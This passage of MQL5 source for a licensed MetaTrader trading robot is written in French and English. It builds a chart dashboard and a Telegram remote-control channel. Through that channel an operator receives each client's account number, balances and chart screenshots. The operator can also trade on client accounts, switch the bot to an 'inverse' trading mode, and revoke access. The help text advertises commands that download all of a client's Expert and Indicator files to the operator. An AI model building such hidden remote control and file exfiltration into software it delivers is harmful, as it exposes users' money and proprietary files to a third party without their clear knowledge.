                           msg += "New SL: " + DoubleToString(sl, _Digits);
                           SendTelegramMessage(msg);
                          }
                       }
                    }
                 }
           }
        }
     }
  }
//+------------------------------------------------------------------+---------------------------------------------------------------+

//+------------------------------------------------------------------+---------------------------------------------------------------+
//| Dashboard Functions                                               |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CreateDashboard()
  {
   // Background
   ObjectCreate(0, DASH_BG_NAME, OBJ_RECTANGLE_LABEL, 0, 0, 0);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_XDISTANCE, dashX);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_YDISTANCE, dashY);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_XSIZE, dashWidth);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_YSIZE, dashHeight);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_BGCOLOR, clrDashBg);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_BORDER_TYPE, BORDER_FLAT);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_CORNER, CORNER_LEFT_UPPER);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_COLOR, clrDashTitle);
   ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_WIDTH, 2);

   // Title
   CreateLabel(DASH_TITLE_NAME, "COEUR DE MILLIARDAIRE", dashX + 10, dashY + 8, 11, clrDashTitle, "Impact");

   // Separator 1
   ObjectCreate(0, DASH_SEP1, OBJ_RECTANGLE_LABEL, 0, 0, 0);
   ObjectSetInteger(0, DASH_SEP1, OBJPROP_XDISTANCE, dashX + 5);
   ObjectSetInteger(0, DASH_SEP1, OBJPROP_YDISTANCE, dashY + 38);
   ObjectSetInteger(0, DASH_SEP1, OBJPROP_XSIZE, dashWidth - 10);
   ObjectSetInteger(0, DASH_SEP1, OBJPROP_YSIZE, 2);
   ObjectSetInteger(0, DASH_SEP1, OBJPROP_BGCOLOR, clrDashTitle);
   ObjectSetInteger(0, DASH_SEP1, OBJPROP_COLOR, clrDashTitle);

   // Labels
   CreateLabel(DASH_LABEL_BALANCE, "BALANCE ACTUELLE", dashX + 12, dashY + 50, 9, clrDashText, "Verdana");
   CreateLabel(DASH_VAL_BALANCE, "0.00", dashX + 140, dashY + 50, 10, clrDashText, "Consolas");

   CreateLabel(DASH_LABEL_EQUITY, "EQUITY (NET)", dashX + 12, dashY + 50 + dashLineH, 9, clrDashText, "Verdana");
   CreateLabel(DASH_VAL_EQUITY, "0.00", dashX + 140, dashY + 50 + dashLineH, 10, clrDashText, "Consolas");

   CreateLabel(DASH_LABEL_PROFIT, "PROFIT FLOTTANT", dashX + 12, dashY + 50 + dashLineH * 2, 9, clrDashText, "Verdana");
   CreateLabel(DASH_VAL_PROFIT, "0.00", dashX + 140, dashY + 50 + dashLineH * 2, 10, clrDashText, "Consolas");

   CreateLabel(DASH_LABEL_DAY_PROFIT, "PROFIT DU JOUR", dashX + 12, dashY + 50 + dashLineH * 3, 9, clrDashText, "Verdana");
   CreateLabel(DASH_VAL_DAY_PROFIT, "0.00", dashX + 140, dashY + 50 + dashLineH * 3, 10, clrDashText, "Consolas");

   CreateLabel(DASH_LABEL_LIFETIME, "PROFIT TOTAL", dashX + 12, dashY + 50 + dashLineH * 4, 9, clrDashText, "Verdana");
   CreateLabel(DASH_VAL_LIFETIME, "0.00", dashX + 140, dashY + 50 + dashLineH * 4, 10, clrDashText, "Consolas");

   // Separator 2
   ObjectCreate(0, DASH_SEP2, OBJ_RECTANGLE_LABEL, 0, 0, 0);
   ObjectSetInteger(0, DASH_SEP2, OBJPROP_XDISTANCE, dashX + 5);
   ObjectSetInteger(0, DASH_SEP2, OBJPROP_YDISTANCE, dashY + 215);
   ObjectSetInteger(0, DASH_SEP2, OBJPROP_XSIZE, dashWidth - 10);
   ObjectSetInteger(0, DASH_SEP2, OBJPROP_YSIZE, 1);
   ObjectSetInteger(0, DASH_SEP2, OBJPROP_BGCOLOR, clrDashTitle);
   ObjectSetInteger(0, DASH_SEP2, OBJPROP_COLOR, clrDashTitle);

   CreateLabel(DASH_LABEL_MSG, "ADMIN:", dashX + 12, dashY + 225, 8, clrDashTitle, "Segoe UI");
   CreateLabel(DASH_VAL_MSG, "SYSTEME PRET", dashX + 65, dashY + 225, 8, clrDashText, "Segoe UI");

   CreateLabel(DASH_VAL_MODE, "MODE: NORMAL", dashX + 160, dashY + 10, 8, clrGold, "Impact");

   CreateLabel(DASH_VAL_WHATSAPP, "CONTACT: +229 01 59 02 93 97", dashX + 12, dashHeight + dashY - 18, 7, clrGold, "Arial");

   CreateLabel(DASH_VAL_EMOJI, "😊", dashX + dashWidth - 35, dashY + 10, 14, clrDashTitle);

   CreateLabel(DASH_VAL_LIMITS, "", dashX + 12, dashY + 203, 7, clrDashText, "Verdana");

   CreateLabel(DASH_LABEL_EXPIRY, "EXPIRATION LICENCE", dashX + 12, dashY + 50 + dashLineH * 5 - 2, 8, clrDashText, "Verdana");
   CreateLabel(DASH_VAL_EXPIRY, "0000.00.00", dashX + 160, dashY + 50 + dashLineH * 5 - 2, 8, clrDashText, "Consolas");

   // Chat UI
   ObjectCreate(0, DASH_BTN_CHAT, OBJ_BUTTON, 0, 0, 0);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_XDISTANCE, dashX + 12);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_YDISTANCE, dashY + 250);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_XSIZE, 80);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_YSIZE, 25);
   ObjectSetString(0, DASH_BTN_CHAT, OBJPROP_TEXT, "CHAT 💬");
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_FONTSIZE, 8);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_BGCOLOR, clrDarkSlateGray);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_COLOR, clrWhite);
   ObjectSetInteger(0, DASH_BTN_CHAT, OBJPROP_BORDER_COLOR, clrGold);

   ObjectCreate(0, DASH_EDIT_CHAT, OBJ_EDIT, 0, 0, 0);
   ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_XDISTANCE, dashX + 12);
   ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_YDISTANCE, dashY + 280);
   ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_XSIZE, dashWidth - 100);
   ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_YSIZE, 25);
   ObjectSetString(0, DASH_EDIT_CHAT, OBJPROP_TEXT, "Message...");
   ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_FONTSIZE, 8);
   ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_TIMEFRAMES, OBJ_NO_PERIODS);

   ObjectCreate(0, DASH_BTN_SEND, OBJ_BUTTON, 0, 0, 0);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_XDISTANCE, dashX + dashWidth - 85);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_YDISTANCE, dashY + 280);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_XSIZE, 75);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_YSIZE, 25);
   ObjectSetString(0, DASH_BTN_SEND, OBJPROP_TEXT, "SEND 🚀");
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_FONTSIZE, 8);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_BGCOLOR, clrDarkGreen);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_COLOR, clrWhite);
   ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_TIMEFRAMES, OBJ_NO_PERIODS);

   // TG Link Toggle
   ObjectCreate(0, DASH_BTN_TG, OBJ_BUTTON, 0, 0, 0);
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_XDISTANCE, dashX + 100);
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_YDISTANCE, dashY + 250);
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_XSIZE, 75);
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_YSIZE, 25);
   ObjectSetString(0, DASH_BTN_TG, OBJPROP_TEXT, "TELEGRAM");
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_FONTSIZE, 7);

   CreateLabel(DASH_LABEL_TG, "LINK: ON", dashX + 185, dashY + 256, 7, clrLime, "Verdana");
  }

void CreateLabel(string name, string text, int x, int y, int size, color clr, string font = "Trebuchet MS")
  {
   ObjectCreate(0, name, OBJ_LABEL, 0, 0, 0);
   ObjectSetInteger(0, name, OBJPROP_XDISTANCE, x);
   ObjectSetInteger(0, name, OBJPROP_YDISTANCE, y);
   ObjectSetInteger(0, name, OBJPROP_CORNER, CORNER_LEFT_UPPER);
   ObjectSetString(0, name, OBJPROP_TEXT, text);
   ObjectSetString(0, name, OBJPROP_FONT, font);
   ObjectSetInteger(0, name, OBJPROP_FONTSIZE, size);
   ObjectSetInteger(0, name, OBJPROP_COLOR, clr);
   ObjectSetInteger(0, name, OBJPROP_SELECTABLE, false);
  }

void UpdateDashboard()
  {
   double balance = AccountInfoDouble(ACCOUNT_BALANCE);
   double equity = AccountInfoDouble(ACCOUNT_EQUITY);
   double profit = AccountInfoDouble(ACCOUNT_PROFIT);
   double dayProfit = GetDailyProfit();

   ObjectSetString(0, DASH_VAL_BALANCE, OBJPROP_TEXT, DoubleToString(balance, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));
   ObjectSetString(0, DASH_VAL_EQUITY, OBJPROP_TEXT, DoubleToString(equity, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));

   ObjectSetString(0, DASH_VAL_PROFIT, OBJPROP_TEXT, DoubleToString(profit, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));
   ObjectSetInteger(0, DASH_VAL_PROFIT, OBJPROP_COLOR, (profit >= 0 ? clrLime : clrRed));

   ObjectSetString(0, DASH_VAL_DAY_PROFIT, OBJPROP_TEXT, DoubleToString(dayProfit, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));
   ObjectSetInteger(0, DASH_VAL_DAY_PROFIT, OBJPROP_COLOR, (dayProfit >= 0 ? clrLime : clrRed));

   double lifetime = GetLifetimeProfit();
   ObjectSetString(0, DASH_VAL_LIFETIME, OBJPROP_TEXT, DoubleToString(lifetime, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));
   ObjectSetInteger(0, DASH_VAL_LIFETIME, OBJPROP_COLOR, (lifetime >= 0 ? clrLime : clrRed));

   // Affichage des limites
   string limitText = "Limites: ";
   if(MaxDailyProfitLimit > 0) limitText += "TP " + DoubleToString(MaxDailyProfitLimit, 0) + " | ";
   if(MaxDailyLossLimit > 0) limitText += "SL " + DoubleToString(MaxDailyLossLimit, 0);
   if(MaxDailyProfitLimit <= 0 && MaxDailyLossLimit <= 0) limitText += "Aucune";
   ObjectSetString(0, DASH_VAL_LIMITS, OBJPROP_TEXT, limitText);

   ObjectSetString(0, DASH_VAL_EXPIRY, OBJPROP_TEXT, TimeToString(CurrentExpirationDate, TIME_DATE));
   ObjectSetInteger(0, DASH_VAL_EXPIRY, OBJPROP_COLOR, (TimeCurrent() > CurrentExpirationDate - 86400*7 ? clrOrange : clrDashText));

   ObjectSetString(0, DASH_VAL_MSG, OBJPROP_TEXT, RemoteAdminMsg);

   ObjectSetString(0, DASH_VAL_MODE, OBJPROP_TEXT, "MODE: " + (TradingMode == 1 ? "NORMAL" : "INVERSE"));
   ObjectSetInteger(0, DASH_VAL_MODE, OBJPROP_COLOR, (TradingMode == 1 ? clrGold : clrCyan));

   ObjectSetString(0, DASH_LABEL_TG, OBJPROP_TEXT, "LINK: " + (IsTelegramActive ? "ON" : "OFF") + " (" + IntegerToString(TelegramInterval) + "s)");
   ObjectSetInteger(0, DASH_LABEL_TG, OBJPROP_COLOR, (IsTelegramActive ? clrLime : clrRed));
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_BGCOLOR, (IsTelegramActive ? clrMediumBlue : clrMaroon));
   ObjectSetInteger(0, DASH_BTN_TG, OBJPROP_COLOR, clrWhite);

   if(!RequireAuthorization)
     {
      ObjectSetString(0, DASH_VAL_EMOJI, OBJPROP_TEXT, "🔓");
      ObjectSetString(0, DASH_VAL_MSG, OBJPROP_TEXT, "MODE LIBRE");
     }
   ObjectSetString(0, DASH_VAL_WHATSAPP, OBJPROP_TEXT, "+2290159029397");

   if(!IsAuthorized)
     {
      string emoji = (IsConnectionLost ? "👺" : "😈");
      ObjectSetString(0, DASH_VAL_EMOJI, OBJPROP_TEXT, emoji);
      ObjectSetInteger(0, DASH_VAL_MSG, OBJPROP_COLOR, clrRed);
      ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_COLOR, clrRed);
      ObjectSetInteger(0, DASH_SEP1, OBJPROP_BGCOLOR, clrRed);
      ObjectSetInteger(0, DASH_SEP1, OBJPROP_COLOR, clrRed);
      ObjectSetInteger(0, DASH_SEP2, OBJPROP_BGCOLOR, clrRed);
      ObjectSetInteger(0, DASH_SEP2, OBJPROP_COLOR, clrRed);
     }
   else
     {
      ObjectSetString(0, DASH_VAL_EMOJI, OBJPROP_TEXT, "😊");
      ObjectSetInteger(0, DASH_VAL_MSG, OBJPROP_COLOR, clrDashText);
      ObjectSetInteger(0, DASH_BG_NAME, OBJPROP_COLOR, clrDashTitle);
      ObjectSetInteger(0, DASH_SEP1, OBJPROP_BGCOLOR, clrDashTitle);
      ObjectSetInteger(0, DASH_SEP1, OBJPROP_COLOR, clrDashTitle);
      ObjectSetInteger(0, DASH_SEP2, OBJPROP_BGCOLOR, clrDashTitle);
      ObjectSetInteger(0, DASH_SEP2, OBJPROP_COLOR, clrDashTitle);
     }

   ChartRedraw();
  }

double GetDailyProfit()
  {
   double dailyProfit = 0;
   datetime from = iTime(_Symbol, PERIOD_D1, 0);
   datetime to = TimeCurrent();

   if(HistorySelect(from, to))
     {
      int total = HistoryDealsTotal();
      for(int i = 0; i < total; i++)
        {
         ulong ticket = HistoryDealGetTicket(i);
         if(HistoryDealGetInteger(ticket, DEAL_MAGIC) == InpMagic)
           {
            dailyProfit += HistoryDealGetDouble(ticket, DEAL_PROFIT);
            dailyProfit += HistoryDealGetDouble(ticket, DEAL_COMMISSION);
            dailyProfit += HistoryDealGetDouble(ticket, DEAL_SWAP);
           }
        }
     }
   return dailyProfit;
  }

void DeleteDashboard()
  {
   ObjectDelete(0, DASH_BG_NAME);
   ObjectDelete(0, DASH_BTN_TG);
   ObjectDelete(0, DASH_LABEL_TG);
   ObjectDelete(0, DASH_VAL_MODE);
   ObjectDelete(0, DASH_TITLE_NAME);
   ObjectDelete(0, DASH_SEP1);
   ObjectDelete(0, DASH_SEP2);
   ObjectDelete(0, DASH_LABEL_BALANCE);
   ObjectDelete(0, DASH_VAL_BALANCE);
   ObjectDelete(0, DASH_LABEL_EQUITY);
   ObjectDelete(0, DASH_VAL_EQUITY);
   ObjectDelete(0, DASH_LABEL_PROFIT);
   ObjectDelete(0, DASH_VAL_PROFIT);
   ObjectDelete(0, DASH_LABEL_DAY_PROFIT);
   ObjectDelete(0, DASH_VAL_DAY_PROFIT);
   ObjectDelete(0, DASH_LABEL_LIFETIME);
   ObjectDelete(0, DASH_VAL_LIFETIME);
   ObjectDelete(0, DASH_LABEL_MSG);
   ObjectDelete(0, DASH_VAL_MSG);
   ObjectDelete(0, DASH_VAL_LIMITS);
   ObjectDelete(0, DASH_VAL_WHATSAPP);
   ObjectDelete(0, DASH_VAL_EMOJI);
   ChartRedraw();
  }

//+------------------------------------------------------------------+
//| Telegram Remote Control Logic                                    |
//+------------------------------------------------------------------+
void OnTimer()
  {
   if(!IsTelegramActive) return;

   if(!IsStartedNotified)
     {
      string startMsg = "🤖 Trading Bot Started\n\n";
      startMsg += "Symbol: " + _Symbol + "\n";
      startMsg += "Timeframe: " + EnumToString(Timeframe) + "\n";
      startMsg += "Account: " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN));
      SendTelegramMessage(startMsg);
      IsStartedNotified = true;
     }

   CheckAuthorization(); // Instant activation if file found
   FetchTelegramUpdates();
  }

//+------------------------------------------------------------------+
//| Gestion des évènements graphiques (Boutons du Dashboard)         |
//+------------------------------------------------------------------+
void OnChartEvent(const int id, const long &lparam, const double &dparam, const string &sparam)
  {
   if(id == CHARTEVENT_OBJECT_CLICK)
     {
      // Bouton CHAT : Affiche/Masque la zone de saisie
      if(sparam == DASH_BTN_CHAT)
        {
         bool is_visible = (ObjectGetInteger(0, DASH_EDIT_CHAT, OBJPROP_TIMEFRAMES) != OBJ_NO_PERIODS);
         ObjectSetInteger(0, DASH_EDIT_CHAT, OBJPROP_TIMEFRAMES, is_visible ? OBJ_NO_PERIODS : OBJ_ALL_PERIODS);
         ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_TIMEFRAMES, is_visible ? OBJ_NO_PERIODS : OBJ_ALL_PERIODS);
         if(is_visible) ObjectSetString(0, DASH_EDIT_CHAT, OBJPROP_TEXT, "");
        }
      else if(sparam == DASH_BTN_SEND)
        {
         string msg = ObjectGetString(0, DASH_EDIT_CHAT, OBJPROP_TEXT);
         if(msg != "" && msg != "Message...")
           {
            SendTelegramMessage("💬 *Chat Client (" + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ")* :\n" + msg);
            ObjectSetString(0, DASH_EDIT_CHAT, OBJPROP_TEXT, "Envoyé !");
            ObjectSetInteger(0, DASH_BTN_SEND, OBJPROP_STATE, false);
           }
        }
      else if(sparam == DASH_BTN_TG)
        {
         IsTelegramActive = !IsTelegramActive;
         if(IsTelegramActive)
           {
            EventSetTimer(TelegramInterval);
            SendTelegramMessage("🌐 *Telegram Link RE-ESTABLISHED* on account " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
           }
         else
           {
            SendTelegramMessage("🚫 *Telegram Link SUSPENDED* on account " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
            EventKillTimer();
           }
         SavePerformanceLimits();
         UpdateDashboard();
        }
     }
  }

void FetchTelegramUpdates()
  {
   if(TelegramToken == "") return;

   // Timeout réduit pour éviter de bloquer le thread principal (SCALPING)
   string url = "https://api.telegram.org/bot" + TelegramToken + "/getUpdates?offset=" + IntegerToString(LastUpdateID + 1) + "&timeout=0";
   uchar data[];
   uchar result[];
   string headers;

   int res = WebRequest("GET", url, (string)NULL, 2000, data, result, headers);

   if(res == 200)
     {
      ConsecutiveTelegramFailures = 0;
      LastTelegramSuccess = TimeCurrent();
      IsConnectionLost = false;
      // Utilisation de CP_UTF8 pour garantir la lecture correcte des messages
      string response = CharArrayToString(result, 0, WHOLE_ARRAY, CP_UTF8);
      ProcessTelegramResponse(response);
     }
   else
     {
      if(res != 404 && res != 502) // Ignorer les erreurs temporaires courantes
        {
         ConsecutiveTelegramFailures++;
         uint elapsed = (uint)(TimeCurrent() - LastTelegramSuccess);
         Log("Telegram Fetch Error. Echec depuis ", IntegerToString(elapsed), "s. Limite: ", IntegerToString(ConnectionGraceMinutes * 60), "s");

         if(elapsed > (uint)ConnectionGraceMinutes * 60)
            HandleConnectionFailure();
        }
     }
  }

void ProcessTelegramResponse(string json)
  {
   if(json == "" || json == "{\"ok\":true,\"result\":[]}") return;

   // Journaliser le JSON pour diagnostic si nécessaire (tronqué pour ne pas saturer le journal)
   // Log("Telegram Debug - RAW: ", StringSubstr(json, 0, 500));

   int updatePos = 0;
   while((updatePos = StringFind(json, "{\"update_id\":", updatePos)) != -1)
     {
      int nextUpdate = StringFind(json, "{\"update_id\":", updatePos + 1);
      string block = (nextUpdate == -1) ? StringSubstr(json, updatePos) : StringSubstr(json, updatePos, nextUpdate - updatePos);

      // 1. Extraction ID Mise à jour
      int idIdx = StringFind(block, "\"update_id\":");
      if(idIdx != -1)
        {
         int endId = StringFind(block, ",", idIdx);
         if(endId == -1) endId = StringFind(block, "}", idIdx);
         LastUpdateID = StringToInteger(StringSubstr(block, idIdx + 12, endId - (idIdx + 12)));
        }

      // 2. Extraction Chat ID
      string currentChatID = "";
      int chatIdx = StringFind(block, "\"chat\":{\"id\":");
      if(chatIdx != -1)
        {
         int endChat = StringFind(block, ",", chatIdx + 13);
         if(endChat == -1) endChat = StringFind(block, "}", chatIdx + 13);
         currentChatID = StringSubstr(block, chatIdx + 13, endChat - (chatIdx + 13));
        }

      // 3. Extraction Texte du Message
      string text = "";
      int textIdx = StringFind(block, "\"text\":\"");
      if(textIdx != -1)
        {
         int endText = StringFind(block, "\"", textIdx + 8);
         text = StringSubstr(block, textIdx + 8, endText - (textIdx + 8));
         // Gérer les guillemets échappés dans le texte JSON
         StringReplace(text, "\\/", "/");

         // Supprimer le préfixe '/' s'il est présent pour accepter les commandes sans /
         if(StringFind(text, "/") == 0)
            text = StringSubstr(text, 1);
        }

      // 4. Traitement
      if(text != "" && currentChatID != "")
        {
         Log("Telegram - Message recu de ", currentChatID, ": ", text);

         if(currentChatID == TelegramChatID)
           {
            // Gestion de la confirmation de sécurité
            if(IsAwaitingSecurity)
              {
               if(text == "tous" || text == "groupe" || text == "ok")
                 {
                  ExecuteValidatedCommand(PendingCommand);
                  SendTelegramMessage("✅ Commande de GROUPE executee.");
                  return;
                 }
               else if(text == "non" || text == "annuler")
                 {
                  IsAwaitingSecurity = false;
                  PendingCommand = "";
                  SendTelegramMessage("❌ Commande ANNULEE.");
                  return;
                 }
               else if(StringToInteger(text) > 0)
                 {
                  string fullCmd = "";
                  int firstSpace = StringFind(PendingCommand, " ");
                  if(firstSpace != -1)
                     fullCmd = StringSubstr(PendingCommand, 0, firstSpace) + " " + text + " " + StringSubstr(PendingCommand, firstSpace + 1);
                  else
                     fullCmd = PendingCommand + " " + text;

                  ExecuteValidatedCommand(fullCmd);
                  SendTelegramMessage("🎯 Commande executee pour le compte " + text);
                  return;
                 }
              }

            // Vérification du délai d'inactivité (60 secondes)
            if(LastCommandTime != 0 && (TimeCurrent() - LastCommandTime > 60) && !IsAwaitingSecurity)
              {
               PendingCommand = text;
               IsAwaitingSecurity = true;

               string ask = "🛡️ *SECURITE ANTI-ERREUR*\n\n";
               ask += "La derniere commande date d'il y a plus d'une minute.\n";
               ask += "Action demandee : `" + text + "`\n\n";
               ask += "Est-ce une commande de GROUPE ou SPECIFIQUE ?\n";
               ask += "• Repondez `tous` pour tout le groupe\n";
               ask += "• Envoyez l'ID du compte (ex: `123456`) pour cibler\n";
               ask += "• Repondez `non` pour annuler";

               // Protection contre le spam de messages si plusieurs bots tournent sur le même terminal
               if(!GlobalVariableCheck("TgSecurityAsked") || TimeCurrent() - (datetime)GlobalVariableGet("TgSecurityAsked") > 5)
                 {
                  GlobalVariableSet("TgSecurityAsked", (double)TimeCurrent());
                  SendTelegramMessage(ask);
                 }
               return;
              }

            // On délègue tout le filtrage à ExecuteValidatedCommand
            ExecuteValidatedCommand(text);
           }
         else
           {
            Log("⚠️ Telegram - Chat ID NON AUTORISE : ", currentChatID, ". Attendu : ", TelegramChatID);
            Log("   CONSEIL: Si c'est votre Chat ID, mettez a jour la variable TelegramChatID dans le code.");
           }
        }

      if(nextUpdate == -1) break;
      updatePos = nextUpdate;
     }
  }

void ExecuteValidatedCommand(string cmd)
  {
   // S'assurer que les ID de compte sont extraits
   if(!IsTargeted(cmd))
     {
      // Pas pour nous
      return;
     }

   Log("Telegram - Commande en cours d'execution: ", cmd);

   bool handled = false;
   if(HandleRemoteCommand(cmd)) handled = true;
   if(HandleUserCommands(cmd)) handled = true;
   if(HandleTradeCommands(cmd)) handled = true;

   if(!handled)
     {
      SendTelegramMessage("❓ Commande inconnue ou ignoree : `" + cmd + "`. Tapez `help` pour voir les commandes valides.");
     }

   // Mise à jour du timestamp pour la sécurité temporelle
   LastCommandTime = TimeCurrent();
   IsAwaitingSecurity = false;
   PendingCommand = "";
  }

bool HandleRemoteCommand(string cmd)
  {
   StringTrimLeft(cmd);
   StringTrimRight(cmd);

   if(cmd == "ping")
     {
      SendTelegramMessage("🏓 PONG ! Bot actif sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
      return true;
     }
   else if(cmd == "help")
     {
      string help = "📜 *GUIDE COMPLET DES COMMANDES* 🤖\n";
      help += "_(Le préfixe '/' est facultatif)_\n\n";

      help += "📊 *DIAGNOSTIC & STATS*\n";
      help += "• `ping` : Test rapide de connexion\n";
      help += "• `stats [ID]` : Solde, Equité et Profit total\n";
      help += "  _Ex: stats ou stats 1234567_\n";
      help += "• `users` : Détails du compte actif\n";
	      help += "• `screenshot` : Capture réelle du graphique\n";
	      help += "• `list experts` : Liste les fichiers Experts\n";
		      help += "• `list indicators` : Liste les fichiers Indicateurs\n";
		      help += "• `get expert <nom>` : Télécharge un Expert\n";
		      help += "• `get indicator <nom>` : Télécharge un Indicateur\n";
		      help += "• `getall experts` : Télécharge TOUS les Experts\n";
		      help += "• `getall indicators` : Télécharge TOUS les Indicateurs\n\n";

      help += "⚙️ *CONTRÔLE & MESSAGERIE*\n";
      help += "• `stop [ID]` : Bascule ON/OFF l'algorithme\n";
      help += "• `msg [ID] <texte>` : Message sur le Dashboard\n";
      help += "  _Ex: msg Hausse du spread prévue_\n";
      help += "• `chat [ID] <texte>` : Chat direct avec le trader\n\n";

      help += "🎯 *FOCUS & CIBLAGE PERSISTANT*\n";
      help += "• `focus <ID>` : Verrouille les commandes sur UN compte\n";
      help += "• `unfocus` ou `tous` : Mode Broadcast (Tous les comptes)\n\n";

      help += "💰 *TRADING À DISTANCE*\n";
      help += "• `buy [ID] <lots>` : Exécute un ACHAT\n";
      help += "• `sell [ID] <lots>` : Exécute une VENTE\n";
      help += "  _Ex: buy 0.01 ou buy 1234567 0.10_\n\n";

      help += "🛡️ *SÉCURITÉ ANTI-ERREUR*\n";
      help += "En cas d'inactivité > 60s, confirmez par :\n";
      help += "• `tous` : Pour tout le groupe\n";
      help += "• `<ID>` : Pour un compte précis\n\n";

      help += "🔐 *ADMINISTRATION*\n";
      help += "• `auth <ID>` : Approuver un compte\n";
      help += "• `deauth <ID>` : Révoquer un compte\n";
      help += "• `maxprofit [ID] <val>` : Stop si profit atteint\n";
      help += "• `maxloss [ID] <val>` : Stop si perte atteinte\n";
	      help += "• `setexpire [ID] YYYY.MM.DD` : Fixe l'expiration\n";
			      help += "• `setconn [ID] <val> [unite]` : Délai sécurité (min/jour/an)\n";
      help += "• `auth on/off` : Force l'obligation d'auth\n";
      help += "• `tg on/off` : Active/Désactive la liaison Telegram\n";
      help += "• `tg setint <sec>` : Change l'intervalle de polling\n";
   help += "• `mode <1|2>` : Change le mode (1=Normal, 2=Inverse)\n";
      help += "• `clearlog` : Efface le journal Expert\n";
      help += "  _(val=0 pour désactiver les limites)_\n\n";

      help += "💡 *CONSEIL* : `[ID]` est facultatif si vous avez utilisé `focus` ou si vous voulez envoyer à TOUS les comptes.";

      SendTelegramMessage(help);
      return true;
     }
   else if(cmd == "stats")
     {
      double balance = AccountInfoDouble(ACCOUNT_BALANCE);
      double equity = AccountInfoDouble(ACCOUNT_EQUITY);
      double profit = GetLifetimeProfit();

      string stats = "📊 *Bot Stats*:\n\n";
      stats += "Balance: " + DoubleToString(balance, 2) + "\n";
      stats += "Equity: " + DoubleToString(equity, 2) + "\n";
      stats += "Lifetime Profit: " + DoubleToString(profit, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY);
      SendTelegramMessage(stats);
      return true;
     }
   else if(StringFind(cmd, "msg ") == 0)
     {
      RemoteAdminMsg = StringSubstr(cmd, 4); // Prend " msg ..."
      StringTrimLeft(RemoteAdminMsg);
      UpdateDashboard();
      SendTelegramMessage("✅ Message sent to user chart.");
      return true;
     }
   else if(cmd == "stop")
     {
      IsBotDisabled = !IsBotDisabled;
      string status = (IsBotDisabled ? "🔴 Bot STOPPED" : "🟢 Bot RESUMED");
      UpdateDashboard();
      SendTelegramMessage(status);
      return true;
     }
   else if(cmd == "screenshot")
     {
      string filename = "screenshot_" + IntegerToString(GetTickCount()) + ".png";
      if(ChartScreenShot(0, filename, 1200, 800))
        {
         SendTelegramPhoto(filename);
        }
      else
        {
         SendTelegramMessage("❌ Failed to capture screenshot.");
        }
      return true;
     }
   else if(StringFind(cmd, "auth") == 0)
     {
      long acc = StringToInteger(StringSubstr(cmd, 4));
      if(acc > 0)
        {
         string filename = "auth_" + IntegerToString(acc) + ".dat";
         int handle = FileOpen(filename, FILE_WRITE|FILE_BIN|FILE_COMMON);
         if(handle != INVALID_HANDLE)
           {
            FileWriteLong(handle, acc);
            FileClose(handle);
            SendTelegramMessage("✅ Compte " + IntegerToString(acc) + " AUTORISÉ.");
            if(acc == AccountInfoInteger(ACCOUNT_LOGIN))
              {
               IsAuthorized = true;
               RemoteAdminMsg = "BON TRADING";
               UpdateDashboard();
               SendTelegramMessage("🤖 Bot " + IntegerToString(acc) + " : Mon accès est désormais actif. Bon trading !");
              }
           }
        }
      else
        {
         SendTelegramMessage("❓ Format auth incorrect. Utilisez `auth <ID>`.");
        }
      return true;
     }
   else if(StringFind(cmd, "deauth") == 0)
     {
      long acc = StringToInteger(StringSubstr(cmd, 6));
      if(acc > 0)
        {
         string filename = "auth_" + IntegerToString(acc) + ".dat";
         FileDelete(filename, FILE_COMMON);
         SendTelegramMessage("🚫 Compte " + IntegerToString(acc) + " DÉSAUTORISÉ.");
         if(acc == AccountInfoInteger(ACCOUNT_LOGIN)) { IsAuthorized = false; RemoteAdminMsg = "ACCÈS RÉVOQUÉ"; UpdateDashboard(); }
        }
      return true;
     }
   else if(StringFind(cmd, "focus ") == 0)
     {
